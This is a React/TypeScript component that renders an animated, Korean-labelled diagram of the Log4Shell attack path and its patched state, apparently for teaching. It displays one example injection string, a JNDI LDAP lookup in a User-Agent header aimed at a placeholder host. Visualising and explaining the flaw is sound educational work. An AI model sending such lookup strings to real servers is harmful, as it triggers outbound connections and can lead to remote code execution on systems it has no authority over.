import { useEffect, useId, useRef, useState } from "react";
import { useReducedMotion } from "framer-motion";
import type { WorkflowTopologyCanvasProps } from "./WorkflowFocusedViz";

type Box = { x: number; y: number; w: number; h: number };
const ids = ["input", "app", "log4j", "jndi", "remote", "jvm"] as const;
type ActorId = typeof ids[number];
const colors: Record<ActorId, string> = {
  input: "#2563eb", app: "#2563eb", log4j: "#8b5cf6", jndi: "#d97706", remote: "#e11d48", jvm: "#e11d48",
};

// Each role has its own silhouette: request document, server rack, chip,
// lookup diamond, directory tree, and JVM process window.
function RoleDrawing({ actor, color, blocked, danger }: { actor: ActorId; color: string; blocked: boolean; danger: boolean }) {
  return (
    <g fill="none" stroke={color} strokeWidth={2} strokeLinejoin="round">
      {actor === "input" && <>
        <path d="M 9 0 H 60 L 78 18 V 85 H 9 Z M 60 0 V 18 H 78" className="fill-background" />
        <path d="M 21 30 H 65 M 21 42 H 56 M 21 69 H 65" />
        <rect x={19} y={49} width={50} height={14} rx={3} strokeDasharray="4 3" />
        <text x={44} y={60} textAnchor="middle" fontSize={10} fill={color} stroke="none">HTTP</text>
      </>}
      {actor === "app" && <>
        <rect x={3} y={2} width={82} height={80} rx={8} className="fill-background" />
        {[14, 44].map(y => <g key={y}>
          <rect x={12} y={y} width={64} height={24} rx={4} />
          <circle cx={22} cy={y + 12} r={3} fill={color} />
          <path d={`M 38 ${y + 12} H 65`} />
        </g>)}
        <path d="M 24 87 H 64" />
      </>}
      {actor === "log4j" && <>
        {[17, 35, 53, 71].map(x => <path key={x} d={`M ${x} 0 V 10 M ${x} 76 V 86`} />)}
        <rect x={6} y={10} width={76} height={66} rx={7} className="fill-background" />
        <rect x={16} y={20} width={56} height={46} rx={3} className="fill-muted" />
        <text x={44} y={47} textAnchor="middle" fontSize={13} fontWeight={800} fill={color} stroke="none">Log4j</text>
        {blocked && <path d="M 24 58 l 9 8 l 24 -28" strokeWidth={4} />}
      </>}
      {actor === "jndi" && <>
        <path d="M 44 0 L 86 43 L 44 86 L 2 43 Z" className="fill-background" />
        <text x={44} y={48} textAnchor="middle" fontSize={14} fontWeight={800} fill={color} stroke="none">JNDI</text>
        {blocked && <path d="M 11 8 L 77 78" strokeDasharray="5 3" />}
      </>}
      {actor === "remote" && <>
        <rect x={25} y={1} width={38} height={22} rx={4} className="fill-background" />
        <path d="M 44 23 V 42 M 15 57 V 42 H 73 V 57 M 44 42 V 57" />
        {[1, 30, 59].map(x => <rect key={x} x={x} y={57} width={28} height={26} rx={4} className="fill-background" />)}
        <text x={44} y={16} textAnchor="middle" fontSize={10} fill={color} stroke="none">LDAP</text>
      </>}
      {actor === "jvm" && <>
        <rect x={2} y={2} width={84} height={79} rx={7} className="fill-background" />
        <path d="M 2 22 H 86 M 15 37 l 9 9 l -9 9 M 33 56 H 50" />
        <circle cx={13} cy={12} r={3} fill={color} />
        <text x={44} y={72} textAnchor="middle" fontSize={11} fontWeight={700} fill={color} stroke="none">{danger ? "! RCE ?" : "Java"}</text>
      </>}
    </g>
  );
}

export default function Log4ShellScene({ spec, stepIndex, playing }: WorkflowTopologyCanvasProps) {
  const [compact, setCompact] = useState(false);
  const reducedMotion = useReducedMotion() ?? false;
  const svgRef = useRef<SVGSVGElement>(null);
  const markerId = `log4j-arrow-${useId().replace(/:/g, "")}`;
  const step = stepIndex === null ? null : spec.steps[stepIndex];
  const patched = spec.steps.length === 3;
  const blocked = patched && stepIndex === 2;
  const active = new Set(step?.activeActorIds ?? []);
  const boxes = Object.fromEntries(ids.map((actor, i) => {
    const column = i < 3 ? i : 5 - i;
    return [actor, compact
      ? { x: 30, y: 40 + i * 218, w: 400, h: 174 }
      : { x: 28 + column * 332, y: i < 3 ? 50 : 390, w: 280, h: 220 }];
  })) as Record<ActorId, Box>;

  useEffect(() => {
    const media = window.matchMedia("(max-width: 640px)");
    const sync = () => setCompact(media.matches);
    sync();
    media.addEventListener("change", sync);
    return () => media.removeEventListener("change", sync);
  }, []);
  useEffect(() => {
    if (playing) svgRef.current?.unpauseAnimations();
    else svgRef.current?.pauseAnimations();
  }, [playing, stepIndex, compact, reducedMotion]);

  function pathFor(from: string, to: string): string {
    const a = boxes[from as ActorId], b = boxes[to as ActorId];
    if (compact) {
      if (from === "jndi" && to === "jvm") {
        return `M ${a.x + a.w} ${a.y + 110} H 448 V ${b.y + 110} H ${b.x + b.w}`;
      }
      const down = b.y > a.y;
      return `M 230 ${down ? a.y + a.h : a.y} V ${down ? b.y : b.y + b.h}`;
    }
    if (from === "jndi" && to === "jvm") {
      return `M ${a.x + a.w / 2} ${a.y + a.h} V 660 H ${b.x + b.w / 2} V ${b.y + b.h}`;
    }
    if (a.y === b.y) {
      const right = b.x > a.x;
      return `M ${right ? a.x + a.w : a.x} ${a.y + 110} H ${right ? b.x : b.x + b.w}`;
    }
    return `M ${a.x + a.w / 2} ${a.y + a.h} V ${b.y}`;
  }

  const details: Record<ActorId, [string, string, string]> = {
    input: ["로그에 남을 값", "헤더 · 검색어 등", "공격자가 입력 제어"],
    app: ["HTTP 수신", "logger 호출", "로그 경로에 도달"],
    log4j: patched ? ["✓ 데이터로 기록", "메시지 Lookup 제거", "JNDI 호출 없음"] : ["메시지 / 파라미터", "표현식 평가", "취약한 Lookup 경로"],
    jndi: patched ? ["호출되지 않음", "경로가 여기서 단절", "44228 경로 차단"] : ["이름 → 자원 조회", "서버 측 외부 연결", "신뢰 경계 통과"],
    remote: ["공격자 통제 서버", "객체 · 참조 응답", "추가 로딩은 환경별"],
    jvm: stepIndex === 5 ? ["! 조건부 코드 실행", "JDK · 클래스패스 영향", "애플리케이션 권한"] : ["객체 처리 경로", "실행 조건 확인 필요", "조회 성공 ≠ RCE"],
  };

  return (
    <div className="bg-background">
      <svg ref={svgRef} viewBox={`0 0 ${compact ? 460 : 1000} ${compact ? 1370 : 710}`}
        className="block w-full" role="img" aria-label={`Log4Shell 도형 워크플로우: ${step?.title ?? "전체 구조"}. 요청서, 서버 랙, Log4j 칩, JNDI 마름모, LDAP 트리와 JVM 실행창.`}>
        <defs>
          <marker id={markerId} viewBox="0 0 10 10" refX={9} refY={5} markerWidth={8} markerHeight={8} orient="auto" markerUnits="userSpaceOnUse">
            <path d="M 0 0 L 10 5 L 0 10 Z" fill="context-stroke" />
          </marker>
        </defs>
        <text x={30} y={23} fontSize={12} fontWeight={700} className="fill-muted-foreground">고정된 구성 요소 · 화살표는 호출 / 응답 방향</text>
        {(spec.topologyLinks ?? []).map(link => <path key={`${link.from}-${link.to}`} d={pathFor(link.from, link.to)}
          fill="none" className="stroke-muted-foreground" strokeWidth={1.5} opacity={.4}
          strokeDasharray="5 5" markerEnd={`url(#${markerId})`} />)}
        {ids.map((actor, i) => {
          const b = boxes[actor], highlighted = active.has(actor);
          const color = blocked && (actor === "log4j" || actor === "jndi") ? "#059669" : colors[actor];
          const owner = spec.actors.find(a => a.id === actor)!;
          return <g key={actor} data-actor={actor} data-active={highlighted}>
            <rect x={b.x} y={b.y} width={b.w} height={b.h} rx={12} className="fill-card"
              stroke={highlighted ? color : "hsl(var(--border))"} strokeWidth={highlighted ? 2.5 : 1.3} />
            {highlighted && <rect x={b.x - 4} y={b.y - 4} width={b.w + 8} height={b.h + 8} rx={15}
              fill="none" stroke={color} strokeDasharray="5 4" />}
            <text x={b.x + 17} y={b.y + 25} fontSize={11} fontWeight={700} className="fill-muted-foreground">{`0${i + 1} · ${owner.detail}`}</text>
            <text x={b.x + 17} y={b.y + 49} fontSize={18} fontWeight={800} className="fill-foreground">{owner.label}</text>
            <g transform={`translate(${b.x + 16} ${b.y + 72})`} opacity={highlighted || step === null ? 1 : .65}>
              <RoleDrawing actor={actor} color={color} blocked={blocked} danger={stepIndex === 5} />
            </g>
            {details[actor].map((line, n) => <text key={n} x={b.x + 115} y={b.y + 91 + n * 23}
              fontSize={compact ? 15 : 12} fontWeight={n === 0 ? 700 : 500}
              className={n === 0 ? "fill-foreground" : "fill-muted-foreground"}>{line}</text>)}
            {!compact && <text x={b.x + 17} y={b.y + 199} fontSize={11} fontWeight={700}
              fill={highlighted ? color : undefined} className={highlighted ? undefined : "fill-muted-foreground"}>
              {highlighted ? "● 현재 참여 중" : "○ 전체 흐름의 구성 요소"}
            </text>}
          </g>;
        })}
        {(step?.transitions ?? []).map((transition, i) => {
          const d = pathFor(transition.from, transition.to);
          const color = transition.kind === "response" ? "#8b5cf6" : transition.kind === "event" && stepIndex === 5 ? "#e11d48" : "#2563eb";
          return <g key={`${stepIndex}-${i}`}>
            <path d={d} fill="none" stroke={color} strokeWidth={3} markerEnd={`url(#${markerId})`} />
            {!reducedMotion && <circle r={4.5} fill={color}>
              <animateMotion dur="2.3s" repeatCount="indefinite" path={d} />
            </circle>}
          </g>;
        })}
        {blocked && <g>
          <path d={compact ? "M 212 665 H 248" : "M 812 330 H 852"} stroke="#059669" strokeWidth={5} />
          <text x={compact ? 30 : 30} y={compact ? 1356 : 695} fontSize={13} fontWeight={700} fill="#059669">✓ 메시지 Lookup 제거 · 이 입력으로 외부 조회하지 않음</text>
        </g>}
      </svg>
      <div className="min-h-14 border-t border-border px-4 py-3 text-xs leading-relaxed text-muted-foreground">
        {step ? <><span className="font-semibold text-foreground">현재 경로: </span>
          {step.transitions?.length ? step.transitions.map(t => `${spec.actors.find(a => a.id === t.from)?.label} → ${spec.actors.find(a => a.id === t.to)?.label} · ${t.label}`).join(" / ") : "Log4j Core · 입력을 문자열로 기록 · JNDI 호출 없음"}</>
          : "점선: 전체 연결 관계 · 실선과 움직이는 점: 현재 단계의 전달 · 코드 실행은 환경에 따라 달라짐"}
      </div>
      <div className="border-t border-border px-4 py-3">
        <p className="mb-2 text-[11px] font-semibold text-muted-foreground">입력 예시 · 실제 요청 없음{blocked ? " · 문자열로 기록됨" : ""}</p>
        <code className="block break-all rounded-lg border border-border bg-background p-3 text-[11px] text-foreground">
          {"User-Agent: ${jndi:ldap://lookup.example.invalid/demo}"}
        </code>
      </div>
    </div>
  );
}
